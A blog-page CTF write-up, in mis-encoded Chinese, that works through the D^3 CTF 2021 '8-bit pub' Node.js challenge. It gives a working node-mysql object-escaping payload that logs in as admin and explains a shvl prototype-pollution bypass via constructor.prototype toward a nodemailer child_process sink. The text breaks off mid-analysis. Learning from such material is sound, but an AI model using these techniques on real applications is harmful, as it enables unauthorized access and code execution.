<!DOCTYPE html>
<html>
    <head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0 user-scalable=1" name="viewport">
    <title>s4mmy&#39;s blog</title> <!--ä½¿ç”¨configä¸­çš„å…¨å±€å˜é‡titleä½œä¸ºæ ‡é¢˜-->
    
    
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="s4mmy's blog" type="application/atom+xml">
</head>
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
 <!-- æ·»åŠ è¿™è¡Œï¼šHighlight.js JavaScriptåº“ -->
    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
</head>
    
    
    <body>
        <header class="header">
    <div class="title">
        <a href="/" class="logo" >s4mmy&#39;s blog</a>
    </div>
    <nav class="navbar">
        <ul class="menu">
            
                <a href="/" class="menu-item-link">Home</a>   
            
                <a href="/journals/" class="menu-item-link">Journals</a>   
            
                <a href="/technical/" class="menu-item-link">Technical</a>   
            
                <a href="/other/" class="menu-item-link">Other</a>   
            
                <a href="/about/" class="menu-item-link">About</a>   
            
        </ul>
    
    </nav>
    
    
</header>



        
        <div class="container">
            <div style="border-bottom:1px solid #eaedf3;"></div>
            
            <article class="post-content">

<script>hljs.highlightAll();</script>    
<div class="post-title">
        <h2>D^3 CTF 2021 8-bit pubå¤ç°</h2>
    </div>
    <div>
        <span class="post-time">2023-06-28</span>
    </div>
    <div class="post-font">
        <h3 id="D-3-CTF-2021-8-bit-pubå¤ç°"><a href="#D-3-CTF-2021-8-bit-pubå¤ç°" class="headerlink" title="D^3 CTF 2021 8-bit pubå¤ç°"></a>D^3 CTF 2021 8-bit pubå¤ç°</h3><p>è¿™é¢˜æ˜¯é¡ºç€ç¾¤é‡Œå¸ˆå‚…çš„é“¾æ¥æ‘¸åˆ°çš„ï¼Œå‰å‰ååæ€»å…±æ‹–äº†ä¸‰å¤©æ‰å®Œæˆã€‚ã€‚ã€‚ã€‚æ‹–å»¶ç—‡å¤ªéš¾å—äº†</p>
<p>githubé¢˜ç›®ä»“åº“ï¼š<a target="_blank" rel="noopener" href="https://github.com/crumbledwall/CTFChallenges/tree/main/D3CTF2021/8-bit_pub">CTFChallenges&#x2F;D3CTF2021&#x2F;8-bit_pub at main Â· crumbledwall&#x2F;CTFChallenges (github.com)</a></p>
<p>æ ¹æ®å¸ˆå‚…æ‰€è¯´æ¯”èµ›çš„æ—¶å€™æ˜¯ç»™äº†æºç çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆä»æºç å…¥æ‰‹ï¼Œgithubä¸Šç›´æ¥æ‹–ä¸‹æ¥çš„é¢˜ç›®æ–‡ä»¶æ˜¯ç»™dockerç”¨çš„ï¼Œè¿™é‡Œè¦å…ˆè¾“å…¥<code>npm install</code>è¡¥å…¨ä¸€äº›ä¾èµ–åº“ï¼Œåˆ°æ—¶å€™å®¡è®¡çš„æ—¶å€™ç”¨å¾—ä¸Šã€‚</p>
<p><img src="/../../img/8-bit%20pub-images/1.png"></p>
<p>é¦–å…ˆå°è¯•æ³¨å†Œç™»å½•ï¼Œç„¶è€Œå¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨ï¼Œé¢˜ç›®éœ€è¦ä½ æ‹¿åˆ°adminçš„è´¦å·</p>
<p>åœ¨<code>route/index.js</code>å¤„å¯ä»¥çœ‹åˆ°å„ä¸ªåŠŸèƒ½çš„è·¯ç”±ï¼ŒæŸ¥çœ‹æ³¨å†Œå’Œç™»å½•çš„æºç æ–‡ä»¶ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ä»£ç </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> sql.<span class="title function_">query</span>(</span><br><span class="line">      <span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>,</span><br><span class="line">      [username, password],</span><br><span class="line">      <span class="keyword">function</span> (<span class="params">err, res</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;error: &quot;</span>, err);</span><br><span class="line">          <span class="keyword">return</span> <span class="title function_">done</span>(err, <span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="title function_">done</span>(<span class="literal">null</span>, res);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"> <span class="attr">signup</span>: <span class="keyword">function</span> (<span class="params">username, password, done</span>) &#123;</span><br><span class="line">    sql.<span class="title function_">query</span>(</span><br><span class="line">      <span class="string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>,</span><br><span class="line">      [username],</span><br><span class="line">      <span class="keyword">function</span> (<span class="params">err, res</span>) &#123;</span><br><span class="line">.......</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„sqlè¯­å¥ä½¿ç”¨äº†å ä½ç¬¦ï¼Œä¼šå¯¹ä¼ è¿›æ¥çš„å‚æ•°è¿›è¡Œè½¬ä¹‰ï¼Œæ‰€ä»¥æ²¡åŠæ³•è¿›è¡Œsqlæ³¨å…¥ã€‚</p>
<p>ä½†æ˜¯åœ¨node-mysqlæ–‡æ¡£çš„æœ«å°¾æœ‰è¿™ä¹ˆä¸€æ®µè¯</p>
<blockquote>
<p><strong>æ³¨æ„ï¼š</strong>ä¸é¢„å¤„ç†è¯­å¥ä¸åŒçš„æ˜¯ï¼Œ<code>?</code>å°±ç®—å‡ºç°åœ¨æ³¨é‡Šæˆ–å­—ç¬¦ä¸²é‡Œï¼Œä¹Ÿä¼šè¢«æ›¿æ¢æˆå¯¹åº”çš„å€¼ã€‚</p>
<p>ä¸åŒç±»å‹çš„å€¼ä¼šæŒ‰ä¸åŒçš„è§„åˆ™è¿›è¡Œè½¬ä¹‰ï¼Œè§„åˆ™å¦‚ä¸‹ï¼š</p>
<ul>
<li>æ•°å­—ä¿æŒä¸å˜</li>
<li>å¸ƒå°”å€¼ä¼šè¢«è½¬æ¢ä¸º<code>true</code>&#x2F;<code>false</code></li>
<li>æ—¥æœŸå¯¹è±¡è½¬æ¢ä¸º<code>&#39;YYYY-mm-dd HH:ii:ss&#39;</code>å­—ç¬¦ä¸²</li>
<li>Bufferå¯¹è±¡ä¼šè¢«è½¬æ¢ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚<code>X&#39;0fa5&#39;</code></li>
<li>å­—ç¬¦ä¸²ä¼šè¢«å®‰å…¨è½¬ä¹‰</li>
<li>æ•°ç»„ä¼šè¢«è½¬æ¢ä¸ºåˆ—è¡¨ï¼Œä¾‹å¦‚<code>[&#39;a&#39;, &#39;b&#39;]</code>ä¼šè¢«è½¬æ¢ä¸º<code>&#39;a&#39;, &#39;b&#39;</code></li>
<li>åµŒå¥—æ•°ç»„ä¼šè¢«è½¬æ¢ä¸ºåˆ†ç»„åˆ—è¡¨(ç”¨äºæ‰¹é‡æ’å…¥)ï¼Œä¾‹å¦‚<code>[[&#39;a&#39;, &#39;b&#39;], [&#39;c&#39;, &#39;d&#39;]]</code>ä¼šè¢«è½¬æ¢ä¸º<code>(&#39;a&#39;, &#39;b&#39;), (&#39;c&#39;, &#39;d&#39;)</code></li>
<li>å…·æœ‰<code>toSqlString</code>æ–¹æ³•çš„å¯¹è±¡ä¼šè°ƒç”¨<code>.toSqlString()</code>ï¼Œå¹¶å°†è¿”å›çš„å€¼ä½œä¸ºåˆå§‹SQLã€‚</li>
<li>å¯¹è±¡ä¸Šçš„å¯æšä¸¾å±æ€§ä¼šè¢«è½¬æ¢ä¸º<code>key = &#39;val&#39;</code>é”®å€¼å¯¹ã€‚å¦‚æœå±æ€§å€¼æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å±æ€§ä¼šè¢«å¿½ç•¥ã€‚å¦‚æœå±æ€§å€¼æ˜¯å¯¹è±¡ï¼Œä¼šå¯¹å…¶è°ƒç”¨toString()å¹¶å°†è¿”å›çš„å€¼ä½œä¸ºvalã€‚</li>
<li><code>undefined</code>&#x2F;<code>null</code>ä¼šè½¬æ¢ä¸º<code>NULL</code></li>
<li><code>NaN</code>&#x2F;<code>Infinity</code>ä¿æŒä¸å˜ã€‚ MySQLç›®å‰å¹¶ä¸æ”¯æŒã€‚å¦‚æœä½ å¼ºè¡Œæ’å…¥è¿™ç±»å€¼ï¼Œå°†è§¦å‘MySQLé”™è¯¯ã€‚</li>
</ul>
</blockquote>
<p>è¿™é‡Œæ˜¯åˆ©ç”¨äº†ä¼ å…¥å¯¹è±¡ä¼šè¢«è½¬æ¢ä¸º`key`&#x3D;valçš„é”®å€¼å¯¹çš„è¿™ä¸ªç‰¹æ€§</p>
<p>æ‰€ä»¥è¿™é‡Œçš„æ“ä½œæ˜¯è¦ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œä½¿ç”¨çš„æ˜¯jsonæ ¼å¼çš„æ•°æ®</p>
<p>åœ¨åé¢åµŒå¥—ä¸¤ä¸ªpasswordçš„åŸå› æ˜¯å°±æ˜¯ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&#123;&quot;password&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·åå°çš„æŸ¥è¯¢è¯­å¥æ˜¯è¿™æ ·çš„,ç›¸å½“äºæ„é€ äº†ä¸€ä¸ªä¸‡èƒ½å¯†ç ï¼ŒSQLè¯­å¥ä¸­é€»è¾‘è¿ç®—ç¬¦å…·æœ‰ä¼˜å…ˆçº§ï¼Œã€&#x3D;ã€‘ä¼˜å…ˆäºã€andã€‘,ã€andã€‘ä¼˜å…ˆäºã€orã€‘</p>
<p>sqlæŸ¥è¯¢è¯­å¥å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = &#x27;admin&#x27; AND password = `password` = true</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œæˆ‘æœ¬æ¥æœ‰ä¸ªç–‘æƒ‘ï¼Œå°±æ˜¯åœ¨ä¼ å…¥å¯¹è±¡çš„æ—¶å€™ä¸ºä»€ä¹ˆä¸èƒ½å†<code>username</code>é‚£é‡Œä¹Ÿä¼ å…¥ä¸€ç»„å¯¹è±¡æ¯”å¦‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&#123;&quot;username&quot;:admin&#125;,&quot;password&quot;:&#123;&quot;password&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ç»è¿‡å°è¯•å‘ç°è¿™æ ·ç©¿çš„è¯æ˜¯ä¸è¡Œçš„ã€‚åæ¥é—®äº†å…¶ä»–å¸ˆå‚…ï¼Œåœ¨æ³¨å†Œæ—¶ä¼ å…¥ä¸Šè¿°çš„æ•°æ®ï¼Œç„¶åè¿›å…¥æ•°æ®åº“é‡Œé¢çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°å¦‚æœä¼ å…¥çš„æ˜¯å¯¹è±¡çš„è¯è§£æä¹‹åä¼ åˆ°æ•°æ®åº“çš„å†…å®¹éƒ½æ˜¯NULLæˆ–è€…0ï¼Œè¿™æ ·çš„è¯è¿™å¥ä¸‡èƒ½å¯†ç çš„sqlè¯­å¥å°±ä¸èƒ½æˆç«‹ã€‚</p>
<p><img src="/../../img/8-bit%20pub-images/2.png"></p>
<p>æˆåŠŸç™»é™†ä¹‹åæˆ‘ä»¬å¯ä»¥ç›´æ¥è·³è½¬åˆ°adminé¡µé¢</p>
<p><img src="/../../img/8-bit%20pub-images/3.png"></p>
<p>æœ€æ—©çœ‹åˆ°sqlæ³¨å…¥å ä½ç¬¦çš„æ—¶å€™æˆ‘ä»¥ä¸ºæ˜¯é¢„ç¼–è¯‘ï¼Œæ²¡åŠæ³•æ³¨å…¥ï¼ˆå½“ç„¶å ä½ç¬¦ä¹Ÿä¸èƒ½æ³¨å…¥:ï¼ˆ  ï¼‰ï¼Œæ‰€ä»¥æˆ‘æ”¾å¼ƒäº†sqlæ³¨å…¥çš„æƒ³æ³•ï¼Œæ‰€ä»¥åœ¨è¿™ä¸€æ­¥æˆ‘åŸå…ˆçš„æƒ³æ³•æ˜¯å»ä¼ªé€ sessionç»•è¿‡èº«ä»½éªŒè¯å»ï¼Œå› ä¸ºæˆ‘åœ¨é€šå¾€adminçš„è·¯ç”±ä¸Šçœ‹åˆ°è¿˜è°ƒç”¨äº†auth.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> auth = <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="number">302</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">username</span> !== <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">sendView</span>(<span class="string">&quot;forbidden.html&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;Forbidden.&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">next</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = auth;</span><br></pre></td></tr></table></figure>

<p>è¿™è¾¹éªŒè¯çš„æ˜¯<code>session.username</code>è€Œ<code>session.username</code>æ˜¯ä»è¿™é‡Œè·å¾—çš„</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">signin</span>: <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  user.<span class="title function_">signin</span>(req.<span class="property">body</span>.<span class="property">username</span>, req.<span class="property">body</span>.<span class="property">password</span>, <span class="keyword">function</span> (<span class="params">err, result</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (result.<span class="property">length</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">session</span>)</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">username</span> = result[<span class="number">0</span>].<span class="property">username</span>;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;Signin success.&quot;</span> &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;Username or password wrong.&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè°ƒç”¨çš„user.signig()å‡½æ•°å¦‚ä¸‹</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">signin</span>: <span class="keyword">function</span> (<span class="params">username, password, done</span>) &#123;</span><br><span class="line">    sql.<span class="title function_">query</span>(</span><br><span class="line">      <span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>,</span><br><span class="line">      [username, password],</span><br><span class="line">      <span class="keyword">function</span> (<span class="params">err, res</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;error: &quot;</span>, err);</span><br><span class="line">          <span class="keyword">return</span> <span class="title function_">done</span>(err, <span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="title function_">done</span>(<span class="literal">null</span>, res);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥å¯ä»¥å¾—åˆ°<code>result[0].username</code>çš„å€¼å³ä¸º<code>session.username</code></p>
<p>å› ä¸ºè¿™é¢˜çš„ç¯å¢ƒæ˜¯ç”¨dockeræ­çš„ï¼Œæ²¡åŠæ³•ç›´æ¥ç”¨vscodeè°ƒè¯•ï¼Œæ‰€ä»¥è¿™é‡Œçš„<code>result</code>çš„å€¼æ²¡åŠæ³•çŸ¥é“æ˜¯ä»€ä¹ˆï¼Œä½†çŒœæµ‹æ˜¯æ•°æ®åº“æŸ¥è¯¢è¿”å›çš„ç»“æœï¼Œå…¶ä¸­usernameæ˜¯åˆ—åï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥æ˜¯æ²¡åŠæ³•ä¼ªé€ sessionçš„ã€‚ã€‚:(</p>
<h4 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h4><p>ç™»é™†æˆåŠŸåè·³è½¬åˆ°adminé¡µé¢ï¼Œçœ‹æ ·å­åƒä¸€ä¸ªå‘é€é‚®ä»¶çš„é¡µé¢ã€‚å¼€å§‹ä»£ç å®¡è®¡ï¼</p>
<p>é¦–å…ˆæ ¹æ®è·¯ç”±æ¥åˆ°<code>adminController.js</code>çš„<code>email</code>æ–¹æ³•ï¼Œä¹ä¸€çœ‹å¥½åƒæ²¡æœ‰ä»€ä¹ˆåˆ©ç”¨ç‚¹ã€‚ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="attr">email</span>: <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> contents = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(req.<span class="property">body</span>).<span class="title function_">forEach</span>(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</span><br><span class="line">      shvl.<span class="title function_">set</span>(contents, key, req.<span class="property">body</span>[key]);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    contents.<span class="property">from</span> = <span class="string">&#x27;&quot;admin&quot; 2449970596@qq.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">await</span> <span class="title function_">send</span>(contents);</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">message</span>: <span class="string">&quot;Success.&quot;</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸€ä¸ªç»†èŠ‚å°±æ˜¯å¼•å…¥äº†shvlåº“ï¼ˆå½“æ—¶ç¬¬ä¸€æ¬¡å®¡ä»£ç çš„æ—¶å€™å®Œå…¨æ²¡æœ‰æ”¾åœ¨å¿ƒä¸Šï¼Œåªæ˜¯è§‰å¾—æœ‰ç‚¹å¥‡æ€ªè€Œå·²ï¼Œä»¥åè¦å¤šç•™æ„è¿™äº›è¢«å¼•å…¥çš„åº“ï¼‰ã€‚</p>
<p>å…¶ä¸­åœ¨å‘ä¿¡å‰è°ƒç”¨äº†<code>shvl.set</code>æ–¹æ³•ï¼Œæˆ‘ä»¬æ ¹æ®è·¯å¾„æŸ¥æ‰¾åˆ°<code>/node_modules/shvl/index&quot;</code>å‘ç°å¦‚ä¸‹ä»£ç </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">set</span>  (object, path, val, obj) &#123;</span><br><span class="line">  <span class="keyword">return</span> !<span class="regexp">/^(__proto__|constructor|prototype)$/</span>.<span class="title function_">test</span>(path) &amp;&amp; ((path = path.<span class="property">split</span> ? path.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>) : path.<span class="title function_">slice</span>(<span class="number">0</span>)).<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">1</span>).<span class="title function_">reduce</span>(<span class="keyword">function</span> (<span class="params">obj, p</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> obj[p] = obj[p] || &#123;&#125;;</span><br><span class="line">  &#125;, obj = object)[path.<span class="title function_">pop</span>()] = val), object;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>çœ‹æ ·å­æœ‰ç‚¹åƒåˆå¹¶å‡½æ•°ï¼Œä½†æ˜¯banäº†å¯ä»¥ç”¨æ¥åŸå‹é“¾æ±¡æŸ“çš„æ‰€æœ‰å…³é”®å­—ï¼Œæ‰€ä»¥æ— æ³•åˆ©ç”¨ã€‚</p>
<p>å…¶å®è¿™é‡Œå‡ºäº†ç‚¹é—®é¢˜ï¼Œæˆ‘çœ‹ç½‘ä¸Šå¸ˆå‚…ä»¬çš„wpä¸Šçš„æºç éƒ½æ˜¯åªæœ‰è¿‡æ»¤<code>__proto__</code>è€Œæˆ‘æ‰‹ä¸Šçš„æºç å…¨è¿‡æ»¤äº†ï¼Œä½†æ˜¯åœ¨å®é™…æµ‹è¯•ä¸­å‘ç°ä½¿ç”¨<code>constructor.prototype</code>åˆèƒ½ç»•è¿‡ï¼Œorz.</p>
<p>æ£€æŸ¥package.jsoné‡Œçš„shvlç‰ˆæœ¬ä¹Ÿæ˜¯2.02ï¼Œåœ¨githubä¸Šä¹Ÿèƒ½çœ‹åˆ°åˆ°äº†2.03ç‰ˆæœ¬çš„ä¿®å¤ä¸­æ‰åŠ ä¸Šäº†<code>constructor</code>å’Œ<code>prototype</code>ã€‚</p>
<p><img src="/../../img/8-bit%20pub-images/4.png"></p>
<p>è¿™é‡Œå°±å½“åšåªè¿‡æ»¤<code>__proto__</code>æ¥è¿›è¡Œå®¡è®¡å§</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">set</span>  (object, path, val, obj) &#123;</span><br><span class="line">  <span class="keyword">return</span> !<span class="regexp">/^(__proto__)$/</span>.<span class="title function_">test</span>(path) &amp;&amp; ((path = path.<span class="property">split</span> ? path.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>) : path.<span class="title function_">slice</span>(<span class="number">0</span>)).<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">1</span>).<span class="title function_">reduce</span>(<span class="keyword">function</span> (<span class="params">obj, p</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> obj[p] = obj[p] || &#123;&#125;;</span><br><span class="line">  &#125;, obj = object)[path.<span class="title function_">pop</span>()] = val), object;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>è¿™é‡Œåˆgetäº†ä¸€ä¸ªå®¡è®¡å°æŠ€å·§ï¼Œå¯¹äºè¿™ç§åœ¨githubä¸Šå¼€æºä¸”æœ‰releaseæ›´æ–°çš„è¯å¯ä»¥ç›´æ¥å»æŸ¥çœ‹ä¿®æ”¹äº†å“ªäº›ä»£ç ï¼Œç›´æ¥å®šä½å†å²æ¼æ´ã€‚</strong></p>
<p>é¦–å…ˆå®ç°ä½¿ç”¨testè¿›è¡Œæ­£åˆ™åˆ¤æ–­ï¼Œpathçš„å‚æ•°å†…æ˜¯å¦å«æœ‰<code>__proto__</code>ï¼Œæ‰€ä»¥å¯ä»¥åˆ¤æ–­è¿™é‡Œå­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ä¸”ä½¿ç”¨<code>constructor.prototype</code>ç»•è¿‡ã€‚ï¼ˆè™½ç„¶ä¸æ˜¯å¾ˆæ‡‚ååŠéƒ¨åˆ†ä»£ç çš„å…·ä½“å«ä¹‰ã€‚ã€‚ã€‚ï¼‰</p>
<p>æ‰¾åˆ°åŸå‹é“¾æ±¡æŸ“çš„åœ°æ–¹åå°±è¦å¯»æ‰¾åˆ©ç”¨ç‚¹äº†ã€‚</p>
<p>è¿™é‡Œæœ‰ä¸¤ç§å¯»æ‰¾åˆ©ç”¨ç‚¹çš„æ–¹æ³•</p>
<p>ç¬¬ä¸€ç§</p>
<p>åœ¨vscodeå…¨å±€æœç´¢RCEåˆ©ç”¨ç‚¹ï¼Œä¾‹å¦‚<code>child_process</code>ï¼Œå¯ä»¥åœ¨<code>node_modules\nodemailer\lib\sendmail-transport\index.js</code>é‡Œæ‰¾åˆ°å¦‚ä¸‹ä»£ç </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> spawn = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="property">spawn</span>;</span><br><span class="line"><span class="keyword">const</span> packageData = <span class="built_in">require</span>(<span class="string">&#x27;../../package.json&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> shared = <span class="built_in">require</span>(<span class="string">&#x27;../shared&#x27;</span>);</span><br><span class="line">.....</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SendmailTransport</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">options</span>) &#123;</span><br><span class="line">        options = options || &#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// use a reference to spawn for mocking purposes</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_spawn</span> = spawn;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">options</span> = options || &#123;&#125;;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>ç»§ç»­è·Ÿè¿›æŸ¥çœ‹</p>
